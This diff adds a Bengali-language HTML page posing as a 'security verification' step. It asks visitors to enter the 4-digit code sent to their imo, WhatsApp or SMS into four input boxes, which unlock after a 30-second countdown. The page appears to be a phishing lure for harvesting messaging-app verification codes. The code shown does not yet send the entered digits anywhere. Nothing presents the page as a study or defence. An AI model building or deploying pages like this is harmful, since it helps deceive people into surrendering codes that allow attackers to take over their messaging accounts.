@@ -1,0 +1,58 @@
+<!DOCTYPE html>
+<html lang="bn">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Verification Page</title>
+    <script src="https://cdn.tailwindcss.com"></script>
+    <style>
+        @import url('https://fonts.googleapis.com/css2?family=Noto+Sans+Bengali:wght@400;700&display=swap');
+        body { font-family: 'Noto Sans Bengali', sans-serif; background-color: #f9fafb; }
+        .disabled-input { pointer-events: none; background-color: #f3f4f6; }
+    </style>
+</head>
+<body class="max-w-md mx-auto min-h-screen flex flex-col items-center justify-center p-5">
+
+    <div class="bg-white w-full rounded-[30px] border border-gray-100 p-8 text-center shadow-lg">
+        <h1 class="text-2xl font-bold text-gray-900 mb-4">নিরাপত্তা যাচাই!</h1>
+        <p class="text-[15px] text-gray-600 leading-relaxed mb-6">
+            আনলক/Add করতে আপনার imo, whatsapp অথবা মেসেজ অপশনে আসা ৪-সংখ্যার কোডটি ফাঁকা ঘরে বসান।
+        </p>
+
+        <div id="timerText" class="text-red-500 font-bold text-lg mb-6">৩০ সেকেন্ড অপেক্ষা করুন...</div>
+
+        <div class="flex justify-center gap-3 mb-8">
+            <input type="text" maxlength="1" class="codeInput w-14 h-14 border-2 border-gray-200 rounded-xl text-center text-2xl font-bold outline-none disabled-input">
+            <input type="text" maxlength="1" class="codeInput w-14 h-14 border-2 border-gray-200 rounded-xl text-center text-2xl font-bold outline-none disabled-input">
+            <input type="text" maxlength="1" class="codeInput w-14 h-14 border-2 border-gray-200 rounded-xl text-center text-2xl font-bold outline-none disabled-input">
+            <input type="text" maxlength="1" class="codeInput w-14 h-14 border-2 border-gray-200 rounded-xl text-center text-2xl font-bold outline-none disabled-input">
+        </div>
+        
+        <p class="text-[14px] text-gray-500">কোডটি দেওয়ার জন্য দয়া করে ৩০ সেকেন্ড অপেক্ষা করুন।</p>
+    </div>
+
+    <script>
+        let timeLeft = 30;
+        const timerDisplay = document.getElementById('timerText');
+        const inputs = document.querySelectorAll('.codeInput');
+
+        const countdown = setInterval(() => {
+            timeLeft--;
+            timerDisplay.innerText = timeLeft + " সেকেন্ড অপেক্ষা করুন...";
+
+            if (timeLeft <= 0) {
+                clearInterval(countdown);
+                timerDisplay.innerText = "এখন কোডটি বসান";
+                timerDisplay.classList.replace('text-red-500', 'text-green-600');
+                
+                // ইনপুট বক্সগুলো খুলে দেওয়া হচ্ছে (আনলক)
+                inputs.forEach(input => {
+                    input.classList.remove('disabled-input');
+                    input.style.backgroundColor = 'white';
+                    input.style.borderColor = '#00acee';
+                });
+            }
+        }, 1000);
+    </script>
+</body>
+</html>
